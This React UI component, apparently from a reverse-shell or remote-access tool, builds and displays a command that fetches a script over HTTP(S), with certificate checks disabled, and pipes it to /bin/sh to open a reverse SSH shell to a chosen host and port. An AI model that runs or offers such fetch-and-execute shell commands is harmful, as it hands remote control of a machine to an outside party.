import { useState } from 'react'

import Card from 'react-bootstrap/Card';
import Col from 'react-bootstrap/Col';
import Container from 'react-bootstrap/Container';
import Form from 'react-bootstrap/Form';
import InputGroup from 'react-bootstrap/InputGroup';
import Row from 'react-bootstrap/Row';

function ReverseSshScreen() {

    const [port, setPort] = useState('');
    const [host, setHost] = useState(document.location['host']);
    const [enableHttps, setEnableHttps] = useState(false);

    const command = [
        'curl ',
        enableHttps === true ? "-k " : "",
        "'http",
        enableHttps === true ? "s" : "",
        '://',
        host.length === 0 ? "<HOST>" : host,
        '/api/',
        host.length === 0 ? "<HOST>" : encodeURIComponent(host),
        '/',
        port.length === 0 ? "<PORT>" : encodeURIComponent(port),
        "/reverse-ssh/' | /bin/sh",
    ];

    return (
        <>
            <Container className="p-5">
                <h1>Reverse SSH Shell</h1>

                <Row className="justify-content-center">
                    <Col xs={6}>
                        <Card className="p-4">


                            <InputGroup className="mb-3">

                                <InputGroup.Text>Host</InputGroup.Text>
                                <Form.Control
                                    placeholder="1.2.3.4"
                                    defaultValue={host}
                                    onChange={e => setHost(e.target.value)}
                                >
                                </Form.Control>
                            </InputGroup>

                            <InputGroup className="mb-3">
                                <InputGroup.Text>Port</InputGroup.Text>
                                <Form.Control
                                    placeholder="1234"
                                    onChange={e => setPort(e.target.value)}
                                />
                            </InputGroup>

                            <Form.Check // prettier-ignore
                                type="checkbox"
                                className="mb-3"
                                label="Enable HTTPS"
                                onChange={e => setEnableHttps(e.target.checked)}
                            />

                            <code>{command.join("")}</code>

                        </Card>
                    </Col>
                </Row>
            </Container>
        </>
    )
}

export default ReverseSshScreen;
